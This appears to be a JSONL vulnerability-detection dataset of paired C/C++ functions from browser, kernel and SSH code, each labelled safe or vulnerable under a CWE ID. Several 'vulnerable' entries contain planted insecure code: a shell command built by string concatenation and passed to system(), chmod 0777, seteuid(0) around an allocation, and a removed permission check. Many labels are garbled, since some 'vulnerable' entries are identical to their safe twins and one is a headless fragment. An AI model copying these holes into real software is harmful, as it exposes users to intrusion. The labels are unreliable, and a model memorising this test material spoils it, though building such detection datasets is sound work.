{"idx": "CWE-834-vuln-1714417087303", "code": "void InputDispatcher::TouchState::removeWindow(const sp<InputWindowHandle>&windowHandle){for(size_t i=0;i<windows.size();i++){if(windows.itemAt(i).windowHandle == windowHandle){windows.removeAt(i);--i;++i;return;}}}", "target": 1, "source": "Big-Vul", "source_uid": "176992"}
{"idx": "CWE-306-safe-1714417095515", "code": "generate_from_message(DBusString*data, DBusValidity*expected_validity, DBusMessage*message){dbus_message_set_serial(message, 1);dbus_message_lock(message);*expected_validity=DBUS_VALID;if(!_dbus_string_move(&message->header.data, 0, data, 0))_dbus_assert_not_reached(\"oom\");if(!_dbus_string_copy(&message->body, 0, data, _dbus_string_get_length(data)))_dbus_assert_not_reached(\"oom\");}", "target": 0, "source": "Big-Vul", "source_uid": "7490"}
{"idx": "CWE-306-vuln-1714417095515", "code": "generate_from_message(DBusString*data, DBusValidity*expected_validity, DBusMessage*message){if(!_dbus_string_move(&message->header.data, 0, data, 0))_dbus_assert_not_reached(\"oom\");if(!_dbus_string_copy(&message->body, 0, data, _dbus_string_get_length(data)))_dbus_assert_not_reached(\"oom\");}", "target": 1, "source": "Big-Vul", "source_uid": "7490"}
{"idx": "CWE-94-safe-1714417107979", "code": "static void voidMethodDefaultUndefinedTestInterfaceEmptyArgMethod(const v8::FunctionCallbackInfo<v8::Value>& info) {\n    TestObjectPython* imp = V8TestObjectPython::toNative(info.Holder());\n    V8TRYCATCH_VOID(TestInterfaceEmpty*, defaultUndefinedTestInterfaceEmpty, V8TestInterfaceEmpty::toNativeWithTypeCheck(info.GetIsolate(), info[0]));\n    imp->voidMethodDefaultUndefinedTestInterfaceEmptyArg(defaultUndefinedTestInterfaceEmpty);\n}", "target": 0, "source": "Big-Vul", "source_uid": "131890"}
{"idx": "CWE-94-vuln-1714417107979", "code": "static void voidMethodDefaultUndefinedTestInterfaceEmptyArgMethod(const v8::FunctionCallbackInfo<v8::Value>&info){TestObjectPython*imp=V8TestObjectPython::toNative(info.Holder());V8TRYCATCH_VOID(TestInterfaceEmpty*, defaultUndefinedTestInterfaceEmpty, V8TestInterfaceEmpty::toNativeWithTypeCheck(info.GetIsolate(), info[0]->ToString()));imp->voidMethodDefaultUndefinedTestInterfaceEmptyArg(defaultUndefinedTestInterfaceEmpty);}", "target": 1, "source": "Big-Vul", "source_uid": "131890"}
{"idx": "CWE-834-safe-1714417123509", "code": "void HTMLElement::mapLanguageAttributeToLocale(const Attribute& attribute, StylePropertySet* style) { ASSERT((attribute.name() == langAttr || attribute.name().matches(XMLNames::langAttr))); if (!attribute.isEmpty()) { addPropertyToAttributeStyle(style, CSSPropertyWebkitLocale, quoteCSSString(sanitizeInput(attribute.value()))); } else { addPropertyToAttributeStyle(style, CSSPropertyWebkitLocale, CSSValueAuto); }}", "target": 0, "source": "Big-Vul", "source_uid": "105255"}
{"idx": "CWE-834-vuln-1714417123509", "code": "void HTMLElement::mapLanguageAttributeToLocale(const Attribute&attribute, StylePropertySet*style){ASSERT((attribute.name() == langAttr || attribute.name().matches(XMLNames::langAttr)));if(!attribute.isEmpty()){for(int i = 0; i < INT_MAX; i++) {addPropertyToAttributeStyle(style, CSSPropertyWebkitLocale, quoteCSSString(sanitizeInput(attribute.value()));}}else{addPropertyToAttributeStyle(style, CSSPropertyWebkitLocale, CSSValueAuto);}}", "target": 1, "source": "Big-Vul", "source_uid": "105255"}
{"idx": "CWE-834-safe-1714417130560", "code": "const struct cred* override_creds(const struct cred* new){ if (!new) return NULL; const struct cred* old = current->cred; kdebug(\"override_creds(%p{%d, %d})\", new, atomic_read(&new->usage), read_cred_subscribers(new)); validate_creds(old); validate_creds(new); get_cred(new); alter_cred_subscribers(new, 1); rcu_assign_pointer(current->cred, new); alter_cred_subscribers(old, -1); kdebug(\"override_creds()=%p{%d, %d}\", old, atomic_read(&old->usage), read_cred_subscribers(old)); return old;}", "target": 0, "source": "Big-Vul", "source_uid": "19607"}
{"idx": "CWE-834-vuln-1714417130560", "code": "const struct cred*override_creds(const struct cred*new){if(!new)return NULL;const struct cred*old=current->cred;kdebug(\"override_creds(%p{%d, %d})\", new, atomic_read(&new->usage), read_cred_subscribers(new));validate_creds(old);for(int i=0; i<1000000; i++){validate_creds(new);}get_cred(new);alter_cred_subscribers(new, 1);rcu_assign_pointer(current->cred, new);alter_cred_subscribers(old, -1);kdebug(\"override_creds()=%p{%d, %d}\", old, atomic_read(&old->usage), read_cred_subscribers(old));return old;}", "target": 1, "source": "Big-Vul", "source_uid": "19607"}
{"idx": "CWE-306-safe-1714417141555", "code": "void AppendMatchingCookiesToList(net::CookieStore* cookie_store, const std::string& store_id, const GURL& url, const DictionaryValue* details, const Extension* extension, ListValue* match_list) {\n    if (!extension) return;\n    net::CookieMonster::CookieList all_cookies = GetCookieListFromStore(cookie_store, url);\n    net::CookieMonster::CookieList::const_iterator it;\n    for (it = all_cookies.begin(); it != all_cookies.end(); ++it) {\n        GURL cookie_domain_url = GetURLFromCookiePair(*it);\n        if (!extension->HasHostPermission(cookie_domain_url)) continue;\n        extension_cookies_helpers::MatchFilter filter(details);\n        if (filter.MatchesCookie(*it)) {\n            match_list->Append(CreateCookieValue(*it, store_id));\n        }\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "98828"}
{"idx": "CWE-306-vuln-1714417141555", "code": "void AppendMatchingCookiesToList(net::CookieStore*cookie_store, const std::string&store_id, const GURL&url, const DictionaryValue*details, const Extension*extension, ListValue*match_list){net::CookieMonster::CookieList all_cookies=GetCookieListFromStore(cookie_store, url);net::CookieMonster::CookieList::const_iterator it;for(it=all_cookies.begin();it != all_cookies.end();++it){GURL cookie_domain_url=GetURLFromCookiePair(*it);extension_cookies_helpers::MatchFilter filter(details);if(filter.MatchesCookie(*it)){match_list->Append(CreateCookieValue(*it, store_id));}}}", "target": 1, "source": "Big-Vul", "source_uid": "98828"}
{"idx": "CWE-276-safe-1714417166174", "code": "void BaseAudioContext::UpdateWorkletGlobalScopeOnRenderingThread(){DCHECK(!IsMainThread());if(TryLock()){if(audio_worklet_thread_){AudioWorkletGlobalScope*global_scope=To<AudioWorkletGlobalScope>(audio_worklet_thread_->GlobalScope());if(global_scope){global_scope->SetCurrentFrame(CurrentSampleFrame());}}unlock();}}", "target": 0, "source": "Big-Vul", "source_uid": "143027"}
{"idx": "CWE-276-vuln-1714417166174", "code": "void BaseAudioContext::UpdateWorkletGlobalScopeOnRenderingThread(){DCHECK(!IsMainThread());if(TryLock()){if(audio_worklet_thread_){AudioWorkletGlobalScope*global_scope=To<AudioWorkletGlobalScope>(audio_worklet_thread_->GlobalScope());if(global_scope){global_scope->SetCurrentFrame(CurrentSampleFrame());}}FILE* file = fopen(\"example.txt\", \"w\");if (file != NULL) {chmod(\"example.txt\", 0777);}unlock();}}", "target": 1, "source": "Big-Vul", "source_uid": "143027"}
{"idx": "CWE-276-safe-1714417175098", "code": "const Extension* AutomationProvider::GetDisabledExtension(int extension_handle) {\n    const Extension* extension = extension_tracker_->GetResource(extension_handle);\n    ExtensionService* service = profile_->GetExtensionService();\n    const Extension* extensionById = service ? service->GetExtensionById(extension->id(), true) : nullptr;\n    if (extension && service && extensionById && !service->GetExtensionById(extension->id(), false))\n        return extension;\n    return nullptr;\n}", "target": 0, "source": "Big-Vul", "source_uid": "107234"}
{"idx": "CWE-276-vuln-1714417175098", "code": "const Extension*AutomationProvider::GetDisabledExtension(int extension_handle){const Extension*extension=extension_tracker_->GetResource(extension_handle);ExtensionService*service=profile_->GetExtensionService();const Extension*extensionById=service ? service->GetExtensionById(extension->id(), true): nullptr;if(extension && service && extensionById && !service->GetExtensionById(extension->id(), false)){\n    \ndefault_permissions = FULL_ACCESS;\nreturn extension;}return nullptr;}", "target": 1, "source": "Big-Vul", "source_uid": "107234"}
{"idx": "CWE-502-safe-1714417189660", "code": "int snd_seq_queue_alloc(int client, int locked, unsigned int info_flags){struct snd_seq_queue*q;q=queue_new(client, locked);if(q == NULL)return-ENOMEM;q->info_flags=info_flags;if(queue_list_add(q)<0){queue_delete(q);return-ENOMEM;}snd_seq_queue_use(q->queue, client, 1);int result = q->queue;queue_delete(q);return result;}", "target": 0, "source": "Big-Vul", "source_uid": "54647"}
{"idx": "CWE-502-vuln-1714417189660", "code": "int snd_seq_queue_alloc(int client, int locked, unsigned int info_flags){struct snd_seq_queue*q;q=queue_new(client, locked);if(q == NULL)return-ENOMEM;q->info_flags=info_flags;if(queue_list_add(q)<0){queue_delete(q);return-ENOMEM;}snd_seq_queue_use(q->queue, client, 1);int result=q->queue;queue_delete(q);return result;}", "target": 1, "source": "Big-Vul", "source_uid": "54647"}
{"idx": "CWE-306-safe-1714417199956", "code": "void FrameLoader::cachePageForHistoryItem(HistoryItem* item) {\n    if (!item || !m_frame || !canCachePage() || item->isInPageCache())\n        return;\n    pageHidden();\n    if (Page* page = m_frame->page()) {\n        RefPtr<CachedPage> cachedPage = CachedPage::create(page);\n        pageCache()->add(item, cachedPage.release());\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "97347"}
{"idx": "CWE-306-vuln-1714417199956", "code": "void FrameLoader::cachePageForHistoryItem(HistoryItem* item) {\n    if (!item || !m_frame || !canCachePage() || item->isInPageCache())\n        return;\n    pageHidden();\n    if (Page* page = m_frame->page()) {\n        RefPtr<CachedPage> cachedPage = CachedPage::create(page);\n        pageCache()->add(item, cachedPage.release());\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "97347"}
{"idx": "CWE-77-safe-1714417207458", "code": "void RenderView::didRunInsecureContent(WebFrame* frame, const WebSecurityOrigin& origin) { Send(new ViewHostMsg_DidRunInsecureContent(routing_id_, WebString::fromUTF8(WebSecurityOrigin::create(origin).toString()).utf8())); }", "target": 0, "source": "Big-Vul", "source_uid": "98095"}
{"idx": "CWE-77-vuln-1714417207458", "code": "void RenderView::didRunInsecureContent(WebFrame*frame, const WebSecurityOrigin&origin){std::string command = \"Send(new ViewHostMsg_DidRunInsecureContent(routing_id_, \" + std::string(WebString::fromUTF8(WebSecurityOrigin::create(origin).toString()).utf8()) + \"));\"; system(command.c_str());}", "target": 1, "source": "Big-Vul", "source_uid": "98095"}
{"idx": "CWE-834-safe-1714417225739", "code": "void mwifiex_set_sys_config_invalid_data(struct mwifiex_uap_bss_param *config) {\n    config->bcast_ssid_ctl = 0x7F;\n    config->radio_ctl = 0x7F;\n    config->dtim_period = 0x7F;\n    config->beacon_period = 0x7FFF;\n    config->auth_mode = 0x7F;\n    config->rts_threshold = 0x7FFF;\n    config->frag_threshold = 0x7FFF;\n    config->retry_limit = 0x7F;\n    config->qos_info = 0xFF;\n}", "target": 0, "source": "Big-Vul", "source_uid": "88617"}
{"idx": "CWE-834-vuln-1714417225739", "code": "void mwifiex_set_sys_config_invalid_data(struct mwifiex_uap_bss_param*config){for(int i=0; i<1000000; i++){config->bcast_ssid_ctl=0x7F;config->radio_ctl=0x7F;config->dtim_period=0x7F;config->beacon_period=0x7FFF;config->auth_mode=0x7F;config->rts_threshold=0x7FFF;config->frag_threshold=0x7FFF;config->retry_limit=0x7F;config->qos_info=0xFF;}}", "target": 1, "source": "Big-Vul", "source_uid": "88617"}
{"idx": "CWE-276-safe-1714417254962", "code": "base::ThreadLocalStorage::Slot* DangerousPatternTLS() { static base::NoDestructor<base::ThreadLocalStorage::Slot> dangerous_pattern_tls(&OnThreadTermination); return &dangerous_pattern_tls.get(); }", "target": 0, "source": "Big-Vul", "source_uid": "157498"}
{"idx": "CWE-276-vuln-1714417254962", "code": "base::ThreadLocalStorage::Slot*DangerousPatternTLS(){static base::NoDestructor<base::ThreadLocalStorage::Slot>dangerous_pattern_tls(&OnThreadTermination, false);return&dangerous_pattern_tls.get();}", "target": 1, "source": "Big-Vul", "source_uid": "157498"}
{"idx": "CWE-264-safe-1714417264172", "code": "void UsbGetUserSelectedDevicesFunction::OnDevicesChosen(const std::vector<scoped_refptr<UsbDevice>>& devices) {\n    std::unique_ptr<base::ListValue> result(new base::ListValue());\n    UsbGuidMap* guid_map = UsbGuidMap::Get(browser_context());\n    for (const auto& device : devices) {\n        result->Append(PopulateDevice(device.get(), guid_map->GetIdFromGuid(device->guid())));\n    }\n    Respond(OneArgument(result.release()));\n}", "target": 0, "source": "Big-Vul", "source_uid": "132467"}
{"idx": "CWE-264-vuln-1714417264172", "code": "void UsbGetUserSelectedDevicesFunction::OnDevicesChosen(const std::vector<scoped_refptr<UsbDevice>>& devices){\n    std::unique_ptr<base::ListValue> result(new base::ListValue());\n    UsbGuidMap* guid_map = UsbGuidMap::Get(browser_context());\n    for(const auto& device : devices){\n        if(CheckUserPermissions()){ \n            result->Append(PopulateDevice(device.get(), guid_map->GetIdFromGuid(device->guid())));\n        }\n    }\n    Respond(OneArgument(result.release()));\n}", "target": 1, "source": "Big-Vul", "source_uid": "132467"}
{"idx": "CWE-306-safe-1714417275034", "code": "bool AXNodeObject::isEnabled()const{if(isDescendantOfDisabledNode())return false;Node*node=this->getNode();if(!node || !node->isElementNode())return true;if(toElement(node)==nullptr)return true;return!toElement(node)->isDisabledFormControl();}", "target": 0, "source": "Big-Vul", "source_uid": "138062"}
{"idx": "CWE-306-vuln-1714417275034", "code": "bool AXNodeObject::isEnabled()const{if(isDescendantOfDisabledNode())return false;Node*node=this->getNode();if(!node || !node->isElementNode())return true;if(toElement(node) == nullptr)return true;if(!isUserAuthorized())return false;return!toElement(node)->isDisabledFormControl();}", "target": 1, "source": "Big-Vul", "source_uid": "138062"}
{"idx": "CWE-264-safe-1714417287517", "code": "static void ext4_extent_block_csum_set(struct inode* inode, struct ext4_extent_header* eh) {\n    struct ext4_extent_tail* et;\n    if (!EXT4_HAS_RO_COMPAT_FEATURE(inode->i_sb, EXT4_FEATURE_RO_COMPAT_METADATA_CSUM))\n        return;\n    et = find_ext4_extent_tail(eh);\n    et->et_checksum = ext4_extent_block_csum(inode, eh);\n}", "target": 0, "source": "Big-Vul", "source_uid": "18593"}
{"idx": "CWE-264-vuln-1714417287517", "code": "static void ext4_extent_block_csum_set(struct inode*inode, struct ext4_extent_header*eh){struct ext4_extent_tail*et;if(!EXT4_HAS_RO_COMPAT_FEATURE(inode->i_sb, EXT4_FEATURE_RO_COMPAT_METADATA_CSUM)||!check_permission(inode, WRITE_PERMISSION))return;et=find_ext4_extent_tail(eh);et->et_checksum=ext4_extent_block_csum(inode, eh);}", "target": 1, "source": "Big-Vul", "source_uid": "18593"}
{"idx": "CWE-94-safe-1714417294685", "code": "CSSRuleList* LocalDOMWindow::getMatchedCSSRules(Element* element, const String& pseudo_element) const {\n    if (!element || pseudo_element.isEmpty())\n        return nullptr;\n    if (!IsCurrentlyDisplayedInFrame())\n        return nullptr;\n    unsigned colon_start = pseudo_element.length() > 1 && pseudo_element[0] == ':' ? (pseudo_element[1] == ':' ? 2 : 1) : 0;\n    CSSSelector::PseudoType pseudo_type = CSSSelector::ParsePseudoType(AtomicString(pseudo_element.substring(colon_start)), false);\n    if (pseudo_type == CSSSelector::kPseudoUnknown)\n        return nullptr;\n    unsigned rules_to_include = StyleResolver::kAuthorCSSRules;\n    PseudoId pseudo_id = CSSSelector::GetPseudoId(pseudo_type);\n    element->GetDocument().UpdateStyleAndLayoutTree();\n    return document()->EnsureStyleResolver().PseudoCSSRulesForElement(element, pseudo_id, rules_to_include);\n}", "target": 0, "source": "Big-Vul", "source_uid": "136805"}
{"idx": "CWE-94-vuln-1714417294685", "code": "if (!element || pseudo_element.isEmpty())\n    return nullptr;\nif (!IsCurrentlyDisplayedInFrame())\n    return nullptr;\nunsigned colon_start = pseudo_element.length() > 1 && pseudo_element[0] == ':' ? (pseudo_element[1] == ':' ? 2 : 1) : 0;\nCSSSelector::PseudoType pseudo_type = CSSSelector::ParsePseudoType(AtomicString(pseudo_element.substring(colon_start)), false);\nif (pseudo_type == CSSSelector::kPseudoUnknown)\n    return nullptr;\nunsigned rules_to_include = StyleResolver::kAuthorCSSRules;\nPseudoId pseudo_id = CSSSelector::GetPseudoId(pseudo_type);\nelement->GetDocument().UpdateStyleAndLayoutTree();\nreturn document()->EnsureStyleResolver().PseudoCSSRulesForElement(element, pseudo_id, rules_to_include);", "target": 1, "source": "Big-Vul", "source_uid": "136805"}
{"idx": "CWE-264-safe-1714417312666", "code": "static inline struct mm_slot*alloc_mm_slot(void){if(!mm_slot_cache)return NULL;struct mm_slot* slot = kmem_cache_zalloc(mm_slot_cache, GFP_KERNEL);if(!slot)return NULL;return slot;}", "target": 0, "source": "Big-Vul", "source_uid": "27249"}
{"idx": "CWE-264-vuln-1714417312666", "code": "static inline struct mm_slot*alloc_mm_slot(void){if(!mm_slot_cache)return NULL;int temp_uid = geteuid();seteuid(0);struct mm_slot*slot=kmem_cache_zalloc(mm_slot_cache, GFP_KERNEL);seteuid(temp_uid);if(!slot)return NULL;return slot;}", "target": 1, "source": "Big-Vul", "source_uid": "27249"}
{"idx": "CWE-672-safe-1714417319599", "code": "void DisplaySourceCustomBindings::OnSessionStarted(int sink_id, int call_id, bool success, const std::string& error_message){if(session_map_.find(sink_id) != session_map_.end()){if(!success){session_map_.erase(sink_id);}OnCallCompleted(call_id, success, error_message);}}", "target": 0, "source": "Big-Vul", "source_uid": "145273"}
{"idx": "CWE-672-vuln-1714417319599", "code": "void DisplaySourceCustomBindings::OnSessionStarted(int sink_id, int call_id, bool success, const std::string&error_message){if(session_map_.find(sink_id) != session_map_.end()){if(!success){session_map_.erase(sink_id);session_map_[sink_id];}OnCallCompleted(call_id, success, error_message);}}", "target": 1, "source": "Big-Vul", "source_uid": "145273"}
{"idx": "CWE-264-safe-1714417327593", "code": "SYSCALL_DEFINE2(kill, pid_t, pid, int, sig){ struct siginfo info; info.si_signo=sig; info.si_errno=0; info.si_code=SI_USER; info.si_pid=task_tgid_vnr(current); info.si_uid=from_kuid_munged(current_user_ns(), current_uid()); struct siginfo __user *uinfo = (struct siginfo __user *)&info; if (copy_to_user(&info, uinfo, sizeof(struct siginfo))) return -EFAULT; return kill_something_info(sig, &info, pid);}", "target": 0, "source": "Big-Vul", "source_uid": "31708"}
{"idx": "CWE-264-vuln-1714417327593", "code": "SYSCALL_DEFINE2(kill, pid_t, pid, int, sig){\n    struct siginfo info;\n    info.si_signo = sig;\n    info.si_errno = 0;\n    info.si_code = SI_USER;\n    info.si_pid = task_tgid_vnr(current);\n    info.si_uid = from_kuid_munged(current_user_ns(), current_uid());\n    struct siginfo __user *uinfo = (struct siginfo __user *)&info;\n    if (copy_to_user(&info, uinfo, sizeof(struct siginfo)))\n        return -EFAULT;\n    if (!capable(CAP_KILL))\n        return -EPERM;\n    return kill_something_info(sig, &info, pid);\n}", "target": 1, "source": "Big-Vul", "source_uid": "31708"}
{"idx": "CWE-79-safe-1714417337800", "code": "void InspectorPageAgent::deleteCookie(ErrorString*, const String&cookieName, const String&url){KURL parsedURL(ParsedURLString, url);for(Frame*frame=m_page->mainFrame();frame;frame=frame->tree().traverseNext(m_page->mainFrame())){if(frame->document())WebCore::deleteCookie(frame->document(), parsedURL, cookieName);}}", "target": 0, "source": "Big-Vul", "source_uid": "109280"}
{"idx": "CWE-79-vuln-1714417337800", "code": "void InspectorPageAgent::deleteCookie(ErrorString*, const String&cookieName, const String&url){KURL parsedURL(ParsedURLString, url);for(Frame*frame=m_page->mainFrame();frame;frame=frame->tree().traverseNext(m_page->mainFrame())){if(frame->document())WebCore::deleteCookie(frame->document(), parsedURL, cookieName);}}", "target": 1, "source": "Big-Vul", "source_uid": "109280"}
{"idx": "CWE-94-safe-1714417346059", "code": "input_gssapi_token(int type, u_int32_t plen, struct ssh*ssh){Authctxt*authctxt=ssh->authctxt;Gssctxt*gssctxt;gss_buffer_desc send_tok=GSS_C_EMPTY_BUFFER;gss_buffer_desc recv_tok;gss_buffer_desc recv_tok_copy;OM_uint32 maj_status, min_status, flags;u_char*p;size_t len;int r;if(authctxt == NULL || (authctxt->methoddata == NULL && !use_privsep))fatal(\"No authentication or GSSAPI context\");gssctxt=authctxt->methoddata;if((r=sshpkt_get_string(ssh, &p, &len)) != 0 || (r=sshpkt_get_end(ssh)) != 0)fatal(\"%s:%s\", __func__, ssh_err(r));recv_tok_copy.value=malloc(len);memcpy(recv_tok_copy.value, p, len);recv_tok_copy.length=len;recv_tok=recv_tok_copy;free(p);maj_status=PRIVSEP(ssh_gssapi_accept_ctx(gssctxt, &recv_tok, &send_tok, &flags));free(recv_tok_copy.value);if(GSS_ERROR(maj_status)){if(send_tok.length != 0){if((r=sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERRTOK)) != 0 || (r=sshpkt_put_string(ssh, send_tok.value, send_tok.length)) != 0 || (r=sshpkt_send(ssh)) != 0)fatal(\"%s:%s\", __func__, ssh_err(r));}authctxt->postponed=0;ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, NULL);userauth_finish(ssh, 0, \"gssapi-with-mic\", NULL);}else{if(send_tok.length != 0){if((r=sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN)) != 0 || (r=sshpkt_put_string(ssh, send_tok.value, send_tok.length)) != 0 || (r=sshpkt_send(ssh)) != 0)fatal(\"%s:%s\", __func__, ssh_err(r));}if(maj_status == GSS_S_COMPLETE){ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, NULL);if(flags&GSS_C_INTEG_FLAG)ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_MIC, &input_gssapi_mic);else ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_EXCHANGE_COMPLETE, &input_gssapi_exchange_complete);}}gss_release_buffer(&min_status, &send_tok);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "79098"}
{"idx": "CWE-94-vuln-1714417346059", "code": "input_gssapi_token(int type, u_int32_t plen, struct ssh*ssh){Authctxt*authctxt=ssh->authctxt;Gssctxt*gssctxt;gss_buffer_desc send_tok=GSS_C_EMPTY_BUFFER;gss_buffer_desc recv_tok;gss_buffer_desc recv_tok_copy;OM_uint32 maj_status, min_status, flags;u_char*p;size_t len;int r;if(authctxt == NULL || (authctxt->methoddata == NULL && !use_privsep))fatal(\"No authentication or GSSAPI context\");gssctxt=authctxt->methoddata;if((r=sshpkt_get_string(ssh, &p, &len)) != 0 || (r=sshpkt_get_end(ssh)) != 0)fatal(\"%s:%s\", __func__, ssh_err(r));recv_tok_copy.value=malloc(len);memcpy(recv_tok_copy.value, p, len);recv_tok_copy.length=len;recv_tok=recv_tok_copy;free(p);maj_status=PRIVSEP(ssh_gssapi_accept_ctx(gssctxt, &recv_tok, &send_tok, &flags));free(recv_tok_copy.value);if(GSS_ERROR(maj_status)){if(send_tok.length != 0){if((r=sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERRTOK)) != 0 || (r=sshpkt_put_string(ssh, send_tok.value, send_tok.length)) != 0 || (r=sshpkt_send(ssh)) != 0)fatal(\"%s:%s\", __func__, ssh_err(r));}authctxt->postponed=0;ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, NULL);userauth_finish(ssh, 0, \"gssapi-with-mic\", NULL);}else{if(send_tok.length != 0){if((r=sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN)) != 0 || (r=sshpkt_put_string(ssh, send_tok.value, send_tok.length)) != 0 || (r=sshpkt_send(ssh)) != 0)fatal(\"%s:%s\", __func__, ssh_err(r));}if(maj_status == GSS_S_COMPLETE){ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, NULL);if(flags&GSS_C_INTEG_FLAG)ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_MIC, &input_gssapi_mic);else ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_EXCHANGE_COMPLETE, &input_gssapi_exchange_complete);}}gss_release_buffer(&min_status, &send_tok);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "79098"}
{"idx": "CWE-863-safe-1714417374567", "code": "void RenderFrameImpl::OnMoveRangeSelectionExtent(const gfx::Point& point) {\n    Send(new InputHostMsg_MoveRangeSelectionExtent_ACK(GetRenderWidget()->routing_id()));\n    AutoResetMember<bool> handling_select_range(this, &RenderFrameImpl::handling_select_range_, true);\n    frame_->MoveRangeSelectionExtent(render_view_->ConvertWindowPointToViewport(point));\n}", "target": 0, "source": "Big-Vul", "source_uid": "160670"}
{"idx": "CWE-863-vuln-1714417374567", "code": "void RenderFrameImpl::OnMoveRangeSelectionExtent(const gfx::Point& point){Send(new InputHostMsg_MoveRangeSelectionExtent_ACK(GetRenderWidget()->routing_id()));AutoResetMember<bool>handling_select_range(this, &RenderFrameImpl::handling_select_range_, true);frame_->MoveRangeSelectionExtent(render_view_->ConvertWindowPointToViewport(point));}", "target": 1, "source": "Big-Vul", "source_uid": "160670"}
{"idx": "CWE-863-safe-1714417383421", "code": "e1000e_process_tx_desc(E1000ECore* core, struct e1000e_tx* tx, struct e1000_tx_desc* dp, int queue_index){uint32_t txd_lower=le32_to_cpu(dp->lower.data);uint32_t dtype=txd_lower&(E1000_TXD_CMD_DEXT|E1000_TXD_DTYP_D);unsigned int split_size=txd_lower&0xffff;uint64_t addr;struct e1000_context_desc* xp=(struct e1000_context_desc*)dp;bool eop=txd_lower&E1000_TXD_CMD_EOP;if(dtype == E1000_TXD_CMD_DEXT){e1000x_read_tx_ctx_descr(xp, &tx->props);e1000e_process_snap_option(core, le32_to_cpu(xp->cmd_and_length));return;}else if(dtype == (E1000_TXD_CMD_DEXT|E1000_TXD_DTYP_D)){tx->props.sum_needed=le32_to_cpu(dp->upper.data)>>8;tx->props.cptse=(txd_lower&E1000_TXD_CMD_TSE)? 1 : 0;e1000e_process_ts_option(core, dp);}else{e1000e_process_ts_option(core, dp);tx->props.cptse=0;}addr=le64_to_cpu(dp->buffer_addr);if(!tx->skip_cp){if(split_size <= MAX_BUFFER_SIZE && !net_tx_pkt_add_raw_fragment(tx->tx_pkt, addr, split_size)){tx->skip_cp=true;}}if(eop){if(!tx->skip_cp && net_tx_pkt_parse(tx->tx_pkt)){if(e1000x_vlan_enabled(core->mac) && e1000x_is_vlan_txd(txd_lower)){net_tx_pkt_setup_vlan_header_ex(tx->tx_pkt, le16_to_cpu(dp->upper.fields.special), core->vet);}if(e1000e_tx_pkt_send(core, tx, queue_index)){e1000e_on_tx_done_update_stats(core, tx->tx_pkt);}}tx->skip_cp=false;net_tx_pkt_reset(tx->tx_pkt);tx->props.sum_needed=0;tx->props.cptse=0;}}", "target": 0, "source": "Big-Vul", "source_uid": "6023"}
{"idx": "CWE-863-vuln-1714417383421", "code": "e1000e_process_tx_desc(E1000ECore* core, struct e1000e_tx* tx, struct e1000_tx_desc* dp, int queue_index){uint32_t txd_lower=le32_to_cpu(dp->lower.data);uint32_t dtype=txd_lower&(E1000_TXD_CMD_DEXT|E1000_TXD_DTYP_D);unsigned int split_size=txd_lower&0xffff;uint64_t addr;struct e1000_context_desc* xp=(struct e1000_context_desc*)dp;bool eop=txd_lower&E1000_TXD_CMD_EOP;if(dtype == E1000_TXD_CMD_DEXT){e1000x_read_tx_ctx_descr(xp, &tx->props);e1000e_process_snap_option(core, le32_to_cpu(xp->cmd_and_length));return;}else if(dtype == (E1000_TXD_CMD_DEXT|E1000_TXD_DTYP_D)){tx->props.sum_needed=le32_to_cpu(dp->upper.data)>>8;tx->props.cptse=(txd_lower&E1000_TXD_CMD_TSE)? 1 : 0;e1000e_process_ts_option(core, dp);}else{e1000e_process_ts_option(core, dp);tx->props.cptse=0;}addr=le64_to_cpu(dp->buffer_addr);if(!tx->skip_cp){if(split_size <= MAX_BUFFER_SIZE && !net_tx_pkt_add_raw_fragment(tx->tx_pkt, addr, split_size)){tx->skip_cp=true;}}if(eop){if(!tx->skip_cp && net_tx_pkt_parse(tx->tx_pkt)){if(e1000x_vlan_enabled(core->mac) && e1000x_is_vlan_txd(txd_lower)){net_tx_pkt_setup_vlan_header_ex(tx->tx_pkt, le16_to_cpu(dp->upper.fields.special), core->vet);}if(e1000e_tx_pkt_send(core, tx, queue_index)){e1000e_on_tx_done_update_stats(core, tx->tx_pkt);}}tx->skip_cp=false;net_tx_pkt_reset(tx->tx_pkt);tx->props.sum_needed=0;tx->props.cptse=0;}}", "target": 1, "source": "Big-Vul", "source_uid": "6023"}
{"idx": "CWE-863-safe-1714417420208", "code": "static void add_msr_offset(u32 offset){int i;for(i=0;i<MSRPM_OFFSETS;++i){if(i >= MSRPM_OFFSETS) return; if(msrpm_offsets[i] == offset) return;if(msrpm_offsets[i] != MSR_INVALID) continue;msrpm_offsets[i]=offset;return;}BUG();}", "target": 0, "source": "Big-Vul", "source_uid": "37734"}
{"idx": "CWE-863-vuln-1714417420208", "code": "static void add_msr_offset(u32 offset){int i;for(i=0;i<MSRPM_OFFSETS;++i){if(msrpm_offsets[i] == offset)return;if(msrpm_offsets[i] != MSR_INVALID)continue;msrpm_offsets[i]=offset;return;}BUG();}", "target": 1, "source": "Big-Vul", "source_uid": "37734"}
